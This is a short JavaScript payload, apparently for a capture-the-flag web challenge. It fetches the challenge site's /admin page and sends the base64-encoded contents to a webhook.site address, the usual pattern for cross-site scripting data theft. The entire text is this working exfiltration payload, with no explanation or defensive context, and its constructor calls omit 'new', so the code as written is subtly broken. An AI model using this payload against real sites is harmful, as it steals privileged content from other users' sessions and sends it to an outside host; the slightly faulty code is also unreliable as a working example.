var req1 = XMLHttpRequest();
var req2 = XMLHttpRequest();

req1.open('GET', 'https://ctftogo-notesy.chals.io/admin', false);
req1.send();

req2.open('GET', 'https://webhook.site/7c14abb1-382c-4817-867a-3ce271c96764/?r=' + btoa(req1.responseText), false);
req2.send();
